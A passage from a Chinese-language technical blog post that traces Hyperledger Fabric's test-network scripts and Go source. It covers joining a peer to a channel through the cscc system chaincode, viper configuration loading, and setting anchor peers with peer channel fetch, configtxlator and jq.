class=\"string\">\"cscc\"</span>},</span><br><span class=\"line\">\t\tInput:       input,</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> spec, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>返回一个 ChaincodeSpec 结构体指针，类型指定为 GOLAN 语言，链码ID为\n<strong>cscc</strong>\n，并且还设置了这个链码的输入参数：<code>JoinChain: 创世区块字节码</code></p>\n<p><strong>cscc</strong>，其实是一个内置的系统链码 (System\nChaincode)，全称为 <strong>Configuration System Chaincode</strong>。</p>\n<p>系统链码是由 Hyperledger Fabric\n平台内置的特殊链码，负责处理一些核心功能。开发者不需要自己编写或部署这些系统链码，它们在\nFabric 网络启动时自动部署，并在整个网络中使用。</p>\n<p>JoinChain 这个函数用于将一个新的节点加入到现有的通道中。当调用\n<code>cscc.JoinChain</code>\n时，节点会使用给定的创世区块来加入指定的通道。</p></li>\n<li><p><strong>executeJoin(cf <em>ChannelCmdFactory, spec\n</em>pb.ChaincodeSpec)</strong></p>\n<p>最后，将上面两个函数得到的结果（工厂和spec），放到一起执行。</p>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">executeJoin</span><span class=\"params\">(cf *ChannelCmdFactory, spec *pb.ChaincodeSpec)</span></span> (err <span class=\"type\">error</span>) {</span><br><span class=\"line\">\t<span class=\"comment\">// Build the ChaincodeInvocationSpec message</span></span><br><span class=\"line\">\tinvocation := &amp;pb.ChaincodeInvocationSpec{ChaincodeSpec: spec}</span><br><span class=\"line\">\tcreator, err := cf.Signer.Serialize()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 根据序列化的身份（signer）和链码调用规范（invocation）创建提案</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> prop *pb.Proposal</span><br><span class=\"line\">\tprop, _, err = protoutil.CreateProposalFromCIS(pcommon.HeaderType_CONFIG, <span class=\"string\">\"\"</span>, invocation, creator)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// 根据提案和签名者创建签名的提案</span></span><br><span class=\"line\">\t<span class=\"keyword\">var</span> signedProp *pb.SignedProposal</span><br><span class=\"line\">\tsignedProp, err = protoutil.GetSignedProposal(prop, cf.Signer)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">// EndorserClient 是背书服务的客户端 API。</span></span><br><span class=\"line\">\t<span class=\"comment\">// ProcessProposal 用于处理提案。</span></span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"keyword\">var</span> proposalResp *pb.ProposalResponse</span><br><span class=\"line\">\tproposalResp, err = cf.EndorserClient.ProcessProposal(context.Background(), signedProp)</span><br><span class=\"line\"></span><br><span class=\"line\">\tlogger.Info(<span class=\"string\">\"Successfully submitted proposal to join channel\"</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>还是很清晰的，前两步准备好了请求客户端和要发送的数据，这一步签了名之后，直接调用<code>EndorserClient.ProcessProposal(context.Background(), signedProp)</code>\n来执行提议。</p>\n<p>封装的很深，执行的逻辑还藏在这个函数里。这个函数奇妙，有一个\n<code>context</code> 参数，上下文在这里是怎么用的？</p></li>\n<li><p><code>EndorserClient.ProcessProposal</code></p>\n<blockquote>\n<p>// For semantics around ctx use and closing/ending streaming RPCs,\nplease refer to\nhttps://godoc.org/google.golang.org/grpc#ClientConn.NewStream.</p>\n</blockquote>\n<p>这个是一个接口，这里使用的实现是 <code>perr.pb.go</code>\n中的实现，具体代码如下：</p>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">type</span> endorserClient <span class=\"keyword\">struct</span> {</span><br><span class=\"line\">\tcc *grpc.ClientConn</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(c *endorserClient)</span></span> ProcessProposal(</span><br><span class=\"line\">        ctx context.Context, in *SignedProposal, </span><br><span class=\"line\">        opts ...grpc.CallOption</span><br><span class=\"line\">    ) (*ProposalResponse, <span class=\"type\">error</span>) </span><br><span class=\"line\">{</span><br><span class=\"line\">\tout := <span class=\"built_in\">new</span>(ProposalResponse)</span><br><span class=\"line\">\terr := c.cc.Invoke(ctx, <span class=\"string\">\"/protos.Endorser/ProcessProposal\"</span>, in, out, opts...)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, err</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> out, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p><code>c.cc</code> 就是结构体中定义的 <code>cc *grpc.ClientConn</code>\n一个普通的客户端连接。</p>\n<p>主要方法和属性</p>\n<ul>\n<li><code>Invoke</code>：用于调用 RPC 方法。</li>\n<li><code>NewStream</code>：用于创建流式 RPC 调用。</li>\n<li><code>Target</code>：返回连接的目标地址。</li>\n<li><code>Close</code>：关闭连接并清理相关资源。</li>\n<li><code>State</code>：返回连接的当前状态（例如，<code>Ready</code>、<code>Connecting</code>、<code>Idle</code>\n等）。</li>\n<li><code>WaitForStateChange</code>：等待连接状态发生变化。</li>\n</ul>\n<p>这里传了一个 <code>context.Context</code>\n参数，目的是允许给用户提供控制权，用户可以通过 ctx 对这个grpc goroutine\n进行取消、超时等操作。但是这段代码里没有在上层进行其他控制，所以直接传了一个\n<code>context.Background()</code> 进去。</p>\n<p>关于 gRPC 和 context 的详细内容见文末的附录。</p></li>\n</ul>\n<h3 id=\"viper\">2.3.2 viper</h3>\n<p>但是我还有个疑问，<code>peer channel join</code>\n的参数或者环境变量是在哪里设置的？之前的 <code>osnadmin</code>\n直接在参数里设置全了，而 <code>peer</code> 却没有任何参数设置。</p>\n<p>其实是 <code>network.sh</code> 设置了这个参数：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">FABRIC_CFG_PATH=$PWD/../config/</span><br></pre></td></tr></table></figure>\n<p>在该文件夹里有一个 <code>core.yaml</code>\n里面定义了所有配置，里面写死了：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">peer:</span></span><br><span class=\"line\">\t<span class=\"attr\">address:</span></span><br><span class=\"line\">\t\t<span class=\"string\">localhost:7051</span></span><br></pre></td></tr></table></figure>\n<p>另外，<code>setGlobals</code>\n函数设置了全局变量，用于切换两个组织的配置：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$USING_ORG</span> -eq 1 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_LOCALMSPID=Org1MSP</span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_TLS_ROOTCERT_FILE=<span class=\"variable\">$PEER0_ORG1_CA</span></span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_MSPCONFIGPATH=...org1...</span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_ADDRESS=localhost:7051</span><br><span class=\"line\"><span class=\"keyword\">elif</span> [ <span class=\"variable\">$USING_ORG</span> -eq 2 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_LOCALMSPID=Org2MSP</span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_TLS_ROOTCERT_FILE=<span class=\"variable\">$PEER0_ORG2_CA</span></span><br><span class=\"line\">  <span class=\"built_in\">export</span> =...org2...</span><br><span class=\"line\">  <span class=\"built_in\">export</span> CORE_PEER_ADDRESS=localhost:9051</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>前三个变量来区别组织1和组织2的证书、MSP，最后一个变量区分节点的监听地址。</p>\n<p>（test-network\n中一个组织只有一个节点。实际上，同一个组织下会有多个节点，他们的前三个变量相同，最后一个参数不同）</p>\n<p>这里我很奇怪，怎么又是环境变量，又是配置文件，他们的命名方式都不一样，甚至环境变量还多了一个前缀\n<code>CORE</code> 这怎么关联上的？</p>\n<p>fabric 用了一个 go 的开源库 <code>viper</code>\n，其功能就是很方便的从配置文件中读取值，也能使用环境变量去覆盖配置文件里的值。他会自动解析环境变量，并把变量名小写、将下划线替换。并且源码中还有：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">viper.SetEnvPrefix(<span class=\"string\">\"CORE\"</span>)</span><br></pre></td></tr></table></figure>\n<p>显而易见，是设置了环境变量的前缀为 CORE 。这就是 fabric\n进行配置读取的方式。</p>\n<h3 id=\"总结复盘\">2.3.3 总结复盘</h3>\n<p>至此，<code>peer channel join -b 创世区块.block</code>\n执行完毕。再次复盘提出问题：</p>\n<p>具体来说，这个过程调用了一个系统内置的链码函数\n<code>cscc.JoinChain</code>\n，节点会使用给定的创世区块来加入指定的通道。</p>\n<blockquote>\n<p><strong>问题1：</strong>新的通道是通过创世区块来标识的吗？如果这个通道已经有好多个区块了，新的节点想加入进来，也是通过创世区块来加入吗？如果是，我这个例子都在本地，创世区块就存在本地，其他新节点想加入的时候，怎么获得创世区块？</p>\n<p><strong>通道与创世区块的关系</strong>：</p>\n<ul>\n<li><strong>创世区块</strong>\n是通道的第一个区块，它包含了通道的初始配置和一些重要的元数据。每个通道都有一个唯一的创世区块，通道的标识在区块链中是通过区块链上的区块来维护的，其中创世区块是至关重要的第一块。</li>\n<li>当一个新节点要加入到一个已有的通道时，即使这个通道已经包含了很多区块，新节点仍然是通过创世区块来加入的。这是因为创世区块包含了通道的初始配置和结构信息，节点需要这些信息来了解通道的基本设置。</li>\n</ul>\n<p><strong>获取创世区块</strong>：</p>\n<ul>\n<li>在生产环境中，新节点通常无法直接从本地获得创世区块，而是通过其他方式获取：\n<ol type=\"1\">\n<li><strong>通过已经加入通道的节点</strong>：新节点可以从已经是通道成员的节点那里请求创世区块。这通常通过\n<code>peer channel fetch</code>\n命令来实现，该命令可以从通道的区块链上获取创世区块或其他指定的区块。</li>\n<li><strong>从区块存储库中提取</strong>：在某些情况下，创世区块可能会被存储在一个共享的存储库或文件系统中，节点可以从中获取。</li>\n<li><strong>通过网络传输</strong>：创世区块也可以通过安全的网络传输从其他节点或管理系统中获取。</li>\n</ol></li>\n</ul>\n<p><strong>加入现有通道</strong>：</p>\n<ul>\n<li><p>当新节点使用创世区块加入现有的通道时，它首先会同步到当前通道的最新状态（即下载并验证通道中的所有区块，直到最新的区块）。这样，新节点便可以与通道中的其他节点保持一致。</p>\n<p>这里提到新节点会同步通道的最新状态，这部分代码在 peer\n内部执行。也就是 gRPC 发送请求后，docker 容器里的 peer 执行。</p></li>\n</ul>\n</blockquote>\n<p>调用链码的方式是给背书节点发送 gRPC 请求。</p>\n<p><strong>问题2：</strong>通过阅读源码，我发现这里的背书节点，就是要加入的节点。这是为什么？背书节点的作用是什么？有没有其他使用背书节点的例子？</p>\n<blockquote>\n<p><strong>背书节点的角色</strong>：</p>\n<ul>\n<li>在 Hyperledger Fabric 中，<strong>背书节点（Endorser Peer）</strong>\n是负责模拟和验证交易的节点。每个参与者节点都可以配置为背书节点，背书节点根据链码的逻辑模拟交易，并生成背书（endorsement），背书包含节点对交易的认可。</li>\n<li><strong>为什么背书节点就是要加入的节点</strong>：\n<ul>\n<li>当一个节点想要加入一个通道时，它需要运行一个系统链码（如\n<code>cscc</code>）来执行这个操作。在这种情况下，节点实际上是在请求自己作为背书节点来执行这个操作。这是因为加入通道的过程需要在本节点上进行一些检查和操作（例如验证创世区块、更新节点的通道状态等），这些操作都需要由本节点背书和认可。</li>\n</ul></li>\n<li><strong>背书节点的其他使用例子</strong>：\n<ul>\n<li><strong>交易提案的背书</strong>：在通常的交易流程中，客户端将交易提案发送给多个背书节点。这些节点分别模拟交易并生成背书响应。客户端收集足够的背书后，将交易提交给排序服务（Orderer）。</li>\n<li><strong>链码的安装与实例化</strong>：当一个链码被安装或实例化时，背书节点也会参与其中，模拟链码的执行并生成相应的状态更新或响应。</li>\n</ul></li>\n</ul>\n<p><strong>总结</strong>：</p>\n<ul>\n<li>背书节点在 Fabric\n中不仅用于加入通道的操作，还用于各种交易和链码操作中，是确保区块链数据一致性和安全性的关键组件。</li>\n<li>在你提到的场景中，背书节点执行的 <code>cscc.JoinChain</code>\n操作是为了确保节点正确加入通道，确保它能够获取到通道的配置并同步到最新状态。</li>\n</ul>\n</blockquote>\n<p>同时 <code>peer</code>\n会自动获取配置文件和环境变量。具体让哪个组织、哪个节点加入通道，都是在配置文件和环境变量中设置的。</p>\n<h2 id=\"设置锚定节点\">2.4 设置锚定节点</h2>\n<p>什么是锚定节点？锚定节点的作用是什么？</p>\n<h3 id=\"获取通道配置\">2.4.1 获取通道配置</h3>\n<h4 id=\"peer-channel-fetch-config\">2.4.1.1 peer channel fetch\nconfig</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">peer channel fetch config </span><br><span class=\"line\">\t<span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_block.pb </span><br><span class=\"line\">\t-o localhost:7050 </span><br><span class=\"line\">\t--ordererTLSHostnameOverride orderer.example.com </span><br><span class=\"line\">\t-c <span class=\"variable\">$CHANNEL</span> --tls --cafile <span class=\"string\">\"<span class=\"variable\">$ORDERER_CA</span>\"</span></span><br></pre></td></tr></table></figure>\n<p><code>peer channel fetch</code>\n用于获取一个特定的区块，并把它写入文件。后面可跟参数</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;newest|oldest|config|(number)</span><br></pre></td></tr></table></figure>\n<p>除了 <code>config</code> 都好理解。看看源码</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">switch</span> args[<span class=\"number\">0</span>] {</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\"oldest\"</span>:</span><br><span class=\"line\">\t\tblock, err = cf.DeliverClient.GetOldestBlock()</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\"newest\"</span>:</span><br><span class=\"line\">\t\tblock, err = cf.DeliverClient.GetNewestBlock()</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> <span class=\"string\">\"config\"</span>:</span><br><span class=\"line\">\t\tiBlock, err2 := cf.DeliverClient.GetNewestBlock()</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err2 != <span class=\"literal\">nil</span> { <span class=\"keyword\">return</span> err2 }</span><br><span class=\"line\">    </span><br><span class=\"line\">\t\tlc, err2 := protoutil.GetLastConfigIndexFromBlock(iBlock)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err2 != <span class=\"literal\">nil</span> { <span class=\"keyword\">return</span> err2 }</span><br><span class=\"line\">    </span><br><span class=\"line\">\t\tlogger.Infof(<span class=\"string\">\"Retrieving last config block: %d\"</span>, lc)</span><br><span class=\"line\">\t\tblock, err = cf.DeliverClient.GetSpecifiedBlock(lc)</span><br><span class=\"line\">\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\tnum, err2 := strconv.Atoi(args[<span class=\"number\">0</span>])</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> err2 != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> fmt.Errorf(<span class=\"string\">\"fetch target illegal: %s\"</span>, args[<span class=\"number\">0</span>])</span><br><span class=\"line\">\t\t}</span><br><span class=\"line\">\t\tblock, err = cf.DeliverClient.GetSpecifiedBlock(<span class=\"type\">uint64</span>(num))</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>即最新的块里存放了一项数据，记录最近的 config\n存放在第几个区块里。</p>\n<p>再具体一点，<code>InitCmdFactory</code> 根据有没有设置\n<code>-o</code> 决定需要 <code>peerDeliver</code> 还是\n<code>ordererDeliver</code>。</p>\n<p><code>peerDeliver</code> 还是 <code>ordererDeliver</code>\n唯一的区别在于，<code>peer</code> 创建的 <code>CommonClient</code> 的\n<code>keepalive</code> 选项为 <code>true</code>。</p>\n<blockquote>\n<p><code>keepalive</code>\n是一种网络层的机制，用于在没有数据流动时通过发送定期的 \"心跳\"\n消息来保持连接的活跃状态。</p>\n<p><strong>Peer 节点和 Orderer 节点的通信差异</strong></p>\n<ol type=\"1\">\n<li><strong>Peer 节点的通信需求</strong>：\n<ul>\n<li><strong>实时性和持久连接</strong>：Peer 节点之间或客户端与 Peer\n节点之间的通信往往涉及长时间的实时交互，如链码执行、状态查询、区块广播等。这些操作可能需要持久的连接，尤其是在监听区块事件或等待交易结果时，连接可能会长时间处于空闲状态。</li>\n<li><strong>保持连接稳定</strong>：为了避免在这些操作期间连接断开，<code>keepalive</code>\n选项被启用，以确保连接的稳定性，即使在长时间的空闲期内也能保持连接活跃。</li>\n</ul></li>\n<li><strong>Orderer 节点的通信需求</strong>：\n<ul>\n<li><strong>批量性和间歇通信</strong>：Orderer\n节点的主要职责是排序交易并将它们打包成区块。客户端与 Orderer\n节点的通信通常是间歇性的，如提交交易或请求区块。由于这种通信通常不是长时间持续的，连接建立和断开的频率较高，因此不太需要持续的\n<code>keepalive</code>。</li>\n<li><strong>较短的通信生命周期</strong>：与 Peer\n节点的长时间通信不同，Orderer\n节点的通信一般是短暂且快速的，通常在完成一次性请求后即关闭连接，因此\n<code>keepalive</code> 的需求不大。</li>\n</ul></li>\n</ol>\n</blockquote>\n<p>与 <code>EndorserClient</code> 不同的是，<code>peer</code> 和\n<code>orderer</code> 使用的是 <code>AtomicBroadcast_DeliverClient</code>\n原子的广播。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(x *atomicBroadcastBroadcastClient)</span></span> Send(m *common.Envelope) <span class=\"type\">error</span> {</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x.ClientStream.SendMsg(m)</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(x *atomicBroadcastBroadcastClient)</span></span> Recv() (*BroadcastResponse, <span class=\"type\">error</span>) {</span><br><span class=\"line\">\tm := <span class=\"built_in\">new</span>(BroadcastResponse)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err := x.ClientStream.RecvMsg(m); err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, err</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> m, <span class=\"literal\">nil</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>其中 <code>ClientStream</code> 是 <code>gRPC</code> 的内置对象。</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"params\">(d *DeliverClient)</span></span> GetOldestBlock() (*cb.Block, <span class=\"type\">error</span>) {</span><br><span class=\"line\">\terr := d.seekOldest()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, errors.WithMessage(err, <span class=\"string\">\"error getting oldest block\"</span>)</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> d.readBlock()</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>先发送请求，再读取返回值。go 中使用 gRPC 的请求和返回不用像 Js\n那样特意写异步函数。</p>\n<p>至此，读取了该通道的配置区块并写入 <code>config_block.pb</code>\n本地保存。</p>\n<h4 id=\"configtxlator\">2.4.1.2 configtxlator</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">configtxlator proto_decode </span><br><span class=\"line\">\t--input <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_block.pb </span><br><span class=\"line\">\t--<span class=\"built_in\">type</span> common.Block </span><br><span class=\"line\">\t--output <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_block.json</span><br></pre></td></tr></table></figure>\n<p>这个函数功能很明显，将区块中的数据转为 JSON\n格式。不分析这个工具的源码了，大体上就是用 proto 读取，保存成 json。</p>\n<h4 id=\"jq\">2.4.1.3 jq</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jq .data.data[0].payload.data.config</span><br><span class=\"line\">    <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_block.json &gt;<span class=\"string\">\"<span class=\"variable\">${OUTPUT}</span>\"</span></span><br></pre></td></tr></table></figure>\n<p><code>jq</code> 是一个用于处理 JSON 数据的命令行工具，它可以方便地从\nJSON 文件中提取数据、进行过滤和格式化。</p>\n<p>这段 Bash 代码执行了以下操作：</p>\n<ol type=\"1\">\n<li>使用 <code>jq</code> 从 <code>config_block.json</code>\n文件中提取通道配置块（<code>.data.data[0].payload.data.config</code>\n字段）。</li>\n<li>提取到的数据被写入到由环境变量 <code>OUTPUT</code>\n指定的文件中。</li>\n</ol>\n<h3 id=\"修改通道配置\">2.4.2 修改通道配置</h3>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">jq '.channel_group.groups.Application.groups.'$<span class=\"punctuation\">{</span>CORE_PEER_LOCALMSPID<span class=\"punctuation\">}</span>'.values += <span class=\"punctuation\">{</span><span class=\"attr\">\"AnchorPeers\"</span><span class=\"punctuation\">:</span><span class=\"punctuation\">{</span><span class=\"attr\">\"mod_policy\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"Admins\"</span><span class=\"punctuation\">,</span><span class=\"attr\">\"value\"</span><span class=\"punctuation\">:</span><span class=\"punctuation\">{</span><span class=\"attr\">\"anchor_peers\"</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span><span class=\"punctuation\">{</span><span class=\"attr\">\"host\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"'$HOST'\"</span><span class=\"punctuation\">,</span><span class=\"attr\">\"port\"</span><span class=\"punctuation\">:</span> '$PORT'<span class=\"punctuation\">}</span><span class=\"punctuation\">]</span><span class=\"punctuation\">}</span><span class=\"punctuation\">,</span><span class=\"attr\">\"version\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"0\"</span><span class=\"punctuation\">}</span><span class=\"punctuation\">}</span>' $<span class=\"punctuation\">{</span>TEST_NETWORK_HOME<span class=\"punctuation\">}</span>/channel-artifacts/$<span class=\"punctuation\">{</span>CORE_PEER_LOCALMSPID<span class=\"punctuation\">}</span>config.json &gt; $<span class=\"punctuation\">{</span>TEST_NETWORK_HOME<span class=\"punctuation\">}</span>/channel-artifacts/$<span class=\"punctuation\">{</span>CORE_PEER_LOCALMSPID<span class=\"punctuation\">}</span>modified_config.json</span><br></pre></td></tr></table></figure>\n<p>这段代码使用 <code>jq</code> 修改了 Hyperledger Fabric\n网络中与某个组织（由 <code>CORE_PEER_LOCALMSPID</code>\n环境变量指定）相关的通道配置。具体操作是：</p>\n<ol type=\"1\">\n<li><strong>定位组织的配置部分</strong>：\n<ul>\n<li>通过 <code>jq</code> 表达式\n<code>'.channel_group.groups.Application.groups.'${CORE_PEER_LOCALMSPID}'.values'</code>\n定位到通道配置 JSON 文件中，特定组织的配置部分。</li>\n</ul></li>\n<li><strong>添加或更新锚节点配置</strong>：\n<ul>\n<li>在定位到的组织配置部分中，使用 <code>+=</code> 操作符向\n<code>values</code> 字段中添加或更新一个名为 <code>AnchorPeers</code>\n的配置项。这个配置项包含锚节点的信息，包括\n<code>mod_policy</code>、<code>value</code> 和\n<code>version</code>。</li>\n<li><code>value</code> 字段中嵌套了 <code>anchor_peers</code> 信息，其中\n<code>host</code> 和 <code>port</code> 的值分别从环境变量\n<code>HOST</code> 和 <code>PORT</code>\n中获取，代表了锚节点的主机和端口。</li>\n</ul></li>\n<li><strong>保存修改后的配置</strong>：\n<ul>\n<li>将修改后的 JSON 数据保存到一个新的文件中，该文件路径由\n<code>TEST_NETWORK_HOME</code> 和 <code>CORE_PEER_LOCALMSPID</code>\n环境变量指定，表示该组织的修改后的通道配置。</li>\n</ul></li>\n</ol>\n<h3 id=\"创建配置更新\">2.4.3 创建配置更新</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">createConfigUpdate <span class=\"variable\">${CHANNEL_NAME}</span> <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/<span class=\"variable\">${CORE_PEER_LOCALMSPID}</span>config.json <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/<span class=\"variable\">${CORE_PEER_LOCALMSPID}</span>modified_config.json <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/<span class=\"variable\">${CORE_PEER_LOCALMSPID}</span>anchors.tx</span><br></pre></td></tr></table></figure>\n<p><code>createConfigUpdate</code>\n函数的总体作用是生成一个配置更新交易（configuration update\ntransaction）。这个过程涉及将原始和修改后的通道配置转换为二进制格式，计算出两者之间的差异，并将这个差异打包为一个可以提交的交易。</p>\n<p>其具体实现如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">configtxlator proto_encode --input <span class=\"string\">\"<span class=\"variable\">${ORIGINAL}</span>\"</span> --<span class=\"built_in\">type</span> common.Config --output <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/original_config.pb</span><br><span class=\"line\"></span><br><span class=\"line\">configtxlator proto_encode --input <span class=\"string\">\"<span class=\"variable\">${MODIFIED}</span>\"</span> --<span class=\"built_in\">type</span> common.Config --output <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/modified_config.pb</span><br><span class=\"line\"></span><br><span class=\"line\">configtxlator compute_update --channel_id <span class=\"string\">\"<span class=\"variable\">${CHANNEL}</span>\"</span> --original <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/original_config.pb --updated <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/modified_config.pb --output <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_update.pb</span><br><span class=\"line\"></span><br><span class=\"line\">configtxlator proto_decode --input <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_update.pb --<span class=\"built_in\">type</span> common.ConfigUpdate --output <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_update.json</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">'{\"payload\":{\"header\":{\"channel_header\":{\"channel_id\":\"'</span><span class=\"variable\">$CHANNEL</span><span class=\"string\">'\", \"type\":2}},\"data\":{\"config_update\":'</span>$(<span class=\"built_in\">cat</span> <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_update.json)<span class=\"string\">'}}}'</span> | jq . &gt; <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_update_in_envelope.json</span><br><span class=\"line\"></span><br><span class=\"line\">configtxlator proto_encode --input <span class=\"variable\">${TEST_NETWORK_HOME}</span>/channel-artifacts/config_update_in_envelope.json --<span class=\"built_in\">type</span> common.Envelope --output <span class=\"string\">\"<span class=\"variable\">${OUTPUT}</span>\"</span>  </span><br></pre></td></tr></table></figure>\n<ol type=\"1\">\n<li><strong>编码原始配置文件为二进制格式</strong>：\n<ul>\n<li><strong>目的</strong>：将原始的 JSON 格式配置文件\n(<code>${ORIGINAL}</code>) 编码为 <code>protobuf</code> 格式的二进制文件\n<code>original_config.pb</code>。<code>protobuf</code> 是 Hyperledger\nFabric 用于内部数据表示的格式。</li>\n</ul></li>\n<li><strong>编码修改后的配置文件为二进制格式</strong>：\n<ul>\n<li><strong>目的</strong>：将修改后的 JSON 格式配置文件\n(<code>${MODIFIED}</code>) 编码为 <code>protobuf</code> 格式的二进制文件\n<code>modified_config.pb</code>。</li>\n</ul></li>\n<li><strong>计算配置更新的差异</strong>：\n<ul>\n<li><strong>目的</strong>：比较原始配置和修改后的配置，计算出两者之间的差异，并生成一个表示这些差异的配置更新文件\n<code>config_update.pb</code>。这个文件以 <code>protobuf</code>\n格式保存，包含了需要应用的配置更改。</li>\n</ul></li>\n<li><strong>解码配置更新为 JSON 格式</strong>：\n<ul>\n<li><strong>目的</strong>：将 <code>protobuf</code> 格式的配置更新文件\n<code>config_update.pb</code> 解码回 JSON 格式的文件\n<code>config_update.json</code>，方便后续处理或查看。</li>\n</ul></li>\n<li><strong>创建包含配置更新的信封（Envelope）</strong>：\n<ul>\n<li><strong>目的</strong>：将配置更新嵌入到一个 <code>Envelope</code>\n中，添加必要的元数据（如 <code>channel_id</code>\n和类型）。这是为了将配置更新打包成一个完整的交易，可以提交到区块链网络中。</li>\n</ul></li>\n<li><strong>编码带信封的配置更新为二进制格式</strong>：\n<ul>\n<li><strong>目的</strong>：将包含信封的配置更新（<code>config_update_in_envelope.json</code>）再次编码为\n<code>protobuf</code> 格式的二进制文件，生成最终可以提交的配置更新交易\n<code>anchors.tx</code>。</li>\n</ul></li>\n</ol>\n<h3 id=\"peer-channel-update\">2.4.4 peer channel 